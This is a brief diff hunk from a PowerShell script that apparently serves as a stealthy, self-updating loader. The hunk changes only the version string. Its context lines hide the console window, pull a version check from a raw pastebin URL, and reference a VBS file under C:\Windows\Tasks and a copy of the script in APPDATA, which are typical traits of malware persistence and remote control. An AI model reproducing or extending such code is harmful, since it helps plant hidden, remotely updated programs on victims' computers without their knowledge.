@@ -47,7 +47,7 @@ $Type::ShowWindowAsync($hwnd, 0)
 }
 
 # Check version and update
-$version = "1.3.0"
+$version = "1.3.1"
 $versionCheck = irm -Uri "https://pastebin.com/raw/3axupAKL"
 $VBpath = "C:\Windows\Tasks\service.vbs"
 if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"){
